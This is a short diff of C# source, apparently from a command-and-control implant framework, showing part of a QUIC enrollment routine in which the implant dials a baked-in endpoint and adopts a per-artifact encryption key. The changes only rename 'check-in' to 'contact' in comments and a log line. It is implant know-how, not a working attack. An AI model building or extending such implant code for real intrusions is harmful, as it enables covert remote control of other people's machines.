@@ -13,7 +13,7 @@ namespace Rod.Implant.Internal;
 // independence: a quic-schemed baked enroll endpoint dials this client, and
 // the artifact never needs an HTTP shape at all.
 //
-// A whole source-file module riding the QUIC check-in module's file set (the
+// A whole source-file module riding the QUIC contact module's file set (the
 // bake-time transport trim): the module compiles exactly when the walk holds
 // a quic-schemed entry -- a beacon dial or an enroll dial -- and the dial
 // (QuicWire) is the module's own.
@@ -107,7 +107,7 @@ internal static class QuicEnroll
                 answer.ParentImplantId,
                 dial.PrivateKey);
 
-            // The per-artifact check-in key the enrollment bound: adopted
+            // The per-artifact contact key the enrollment bound: adopted
             // into the transport profile when the bake carried none, so a
             // walk that later crosses onto a web front seals under the key
             // the listener-side binding demands. The key id (16 bytes) and
@@ -121,7 +121,7 @@ internal static class QuicEnroll
                 answer.EnvelopeKeyId.CopyTo(packed, 0);
                 answer.EnvelopeKey.CopyTo(packed, answer.EnvelopeKeyId.Length);
                 dial.Profile.EnvelopeKey = Convert.ToBase64String(packed);
-                dial.Log?.WriteLine("rod-implant: adopted the build's check-in key from the quic enroll answer");
+                dial.Log?.WriteLine("rod-implant: adopted the build's contact key from the quic enroll answer");
             }
 
             dial.OpenedConnection = wire;
